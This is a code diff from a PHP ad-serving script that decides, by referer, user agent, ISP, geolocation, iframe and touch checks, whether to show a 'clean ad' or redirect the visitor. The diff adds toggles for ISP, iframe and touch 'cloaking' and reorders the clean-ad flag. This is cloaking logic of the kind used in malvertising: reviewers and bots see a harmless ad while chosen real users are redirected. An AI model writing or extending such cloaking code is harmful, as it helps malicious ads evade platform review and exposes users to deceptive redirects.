@@ -655,7 +655,6 @@
 
 	$adConfig = processConfig($configFilename);
 
-	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
 	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig['RedirectUrl'] : "";
 	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig['Method'] : "";
 	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig['RedirectTimeout'] : 3000;
@@ -668,6 +667,10 @@
 	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig['OutputMethod'] : "";
 	$trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $adConfig) && $adConfig["TrackingPixelEnabled"] === "false" ? false : true;
 	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig['TrackingPixelUrl'] : "";
+	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
+	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
+	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
+	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
 
 	if (empty($redirectUrl))
 	{
@@ -699,6 +702,8 @@
 			'subdiv2:"'.$geo['subdiv2'].'",'.
 			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
 	}
+
+	$serveCleanAd = false;
 
 	if (!$serveCleanAd && array_key_exists('HTTP_REFERER', $_SERVER))
 	{
@@ -756,7 +761,7 @@
 			adlog($campaignID, "UserAgent is not a mobile device.");
 		}
 	}
-	elseif (!$serveCleanAd)
+	elseif (!$serveCleanAd && $ispCloakingEnabled)
 	{
 		$allowedIsps = array();
 
@@ -826,8 +831,6 @@
 						            document.body.appendChild(el);
 						        }";
 	}
-
-	$serveCleanAd = false;
 
 	if ($serveCleanAd || !$redirectEnabled)
 	{
